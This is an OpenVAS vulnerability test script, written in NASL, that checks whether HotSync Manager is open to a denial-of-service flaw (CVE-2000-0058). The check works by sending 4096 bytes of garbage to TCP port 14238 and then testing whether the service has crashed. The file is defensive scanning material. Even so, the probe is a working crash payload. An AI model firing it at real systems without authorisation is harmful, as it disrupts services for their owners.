###############################################################################
# OpenVAS Vulnerability Test
#
# HotSync Manager Denial of Service attack
#
# Authors:
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 1999 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10102");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(920);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2000-0058");
  script_name("HotSync Manager Denial of Service attack");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 1999 SecuriTeam");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(14238);

  script_tag(name:"solution", value:"Block those ports from outside communication.");

  script_tag(name:"summary", value:"It is possible to cause HotSync Manager to crash by
  sending a few bytes of garbage into its listening port TCP 14238.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

port = 14238;
if( ! get_port_state( port ) )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

data_raw = crap( 4096 ) + string( "\n" );
send( socket:soc, data:data_raw );
close( soc );

sleep( 5 );

soc_sec = open_sock_tcp( port );
if( ! soc_sec ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );